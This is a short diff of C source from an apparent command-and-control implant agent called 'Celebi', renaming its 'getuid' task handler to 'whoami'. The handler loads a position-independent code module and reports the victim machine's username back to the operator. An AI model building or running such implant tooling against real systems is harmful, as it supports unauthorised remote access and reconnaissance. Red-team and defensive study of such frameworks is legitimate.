@@ -85,20 +85,20 @@ void agent_exit(AgentState *state, TaskInfo *task) {
 	#endif
 }
 
-void agent_getuid(AgentState *state, TaskInfo *task) {
+void agent_whoami(AgentState *state, TaskInfo *task) {
 	ResolvedPico pico = { 0 };
-	BOOL result = resolve_loaded_pico(&state->file_vault, &pico, "_builtin_getuid");
+	BOOL result = resolve_loaded_pico(&state->file_vault, &pico, "_builtin_whoami");
 	
 	if (result == FALSE) {
 		#ifdef CELEBI_DEBUG
-		dprintf("Failed to resolve '_builtin_getuid' PICO");
+		dprintf("Failed to resolve '_builtin_whoami' PICO");
 		#endif
 		
 		agent_post(state, task, "failed to resolve PICO", "error: failed to resolve PICO");
 		return;
 	}
 	
-	GETUID_PICO entrypoint = (GETUID_PICO) pico.entrypoint;
+	WHOAMI_PICO entrypoint = (WHOAMI_PICO) pico.entrypoint;
 	char *username = entrypoint();
 	
 	if (username != NULL) {
@@ -203,12 +203,12 @@ void process_task(TaskInfo *task, AgentState *state) {
 		return;
 	}
 	
-	if (MSVCRT$strcmp(task->command, "getuid") == 0) {
+	if (MSVCRT$strcmp(task->command, "whoami") == 0) {
 		#ifdef CELEBI_DEBUG
-		dprintf("Received getuid command.");
+		dprintf("Received whoami command.");
 		#endif
 		
-		agent_getuid(state, task);
+		agent_whoami(state, task);
 		return;
 	}
 	
